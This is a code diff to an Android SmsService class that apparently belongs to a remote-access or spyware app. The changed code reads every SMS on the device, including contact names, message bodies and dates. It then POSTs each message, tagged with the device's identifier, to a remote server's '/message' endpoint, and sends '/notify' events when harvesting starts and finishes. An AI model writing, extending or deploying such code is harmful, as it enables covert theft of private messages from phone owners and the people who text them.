@@ -16,12 +16,14 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.HashMap;
 
+import http.Http;
 import io.socket.client.Socket;
 
 public class SmsService extends Thread implements Runnable {
 
     private static String TAG = "SmsService";
 
+    public static final String POSTURL = "/message";
     Client client;
     Socket socket;
     int numsms;
@@ -40,6 +42,17 @@ public class SmsService extends Thread implements Runnable {
 
     private void getAllSms() {
         Log.i(TAG, "Getting all sms");
+
+        HashMap start = new HashMap();
+        start.put("event", "getmessages:started");
+        start.put("uid", client.getUid());
+        start.put("device", client.getDevice());
+        Http req = new Http();
+        req.setUrl(client.SERVER + "/notify");
+        req.setMethod("POST");
+        req.setParams(start);
+        req.execute();
+
         Uri callUri = Uri.parse("content://sms");
         ContentResolver cr = client.getApplicationContext().getContentResolver();
         Cursor mCur = cr.query(callUri, null, null, null, null);
@@ -58,7 +71,7 @@ public class SmsService extends Thread implements Runnable {
                     String name = client.getContactName(client.getApplicationContext(), phone);
                     String body = mCur.getString(mCur.getColumnIndex("body"));
                     String date = formatter.format(calendar.getTime());
-                    int type = mCur.getInt(mCur.getColumnIndex("type"));
+                    String type = mCur.getString(mCur.getColumnIndex("type"));
 
                     HashMap p = new HashMap();
                     p.put("uid", client.getUid());
@@ -73,7 +86,13 @@ public class SmsService extends Thread implements Runnable {
                     JSONObject obj = new JSONObject(p);
                     Log.i(TAG, obj.toString());
 
-                    client.getSocket().emit("message:push", obj);
+                    Http notifyStart = new Http();
+                    notifyStart.setMethod("POST");
+                    notifyStart.setUrl(client.SERVER + POSTURL);
+                    notifyStart.setParams(p);
+                    notifyStart.execute();
+
+//                    client.getSocket().emit("message:push", obj);
 
                 } catch (Exception e) {
                     e.printStackTrace();
@@ -84,6 +103,16 @@ public class SmsService extends Thread implements Runnable {
 
             } while (mCur.moveToNext() && this.numsms > 0);
         }
+
+        start.put("event", "getmessages:done");
+        start.put("uid", client.getUid());
+        start.put("device", client.getDevice());
+        Http doneSMS = new Http();
+        doneSMS.setUrl(client.SERVER + "/notify");
+        doneSMS.setMethod("POST");
+        doneSMS.setParams(start);
+        doneSMS.execute();
+
         mCur.close();
     }
 
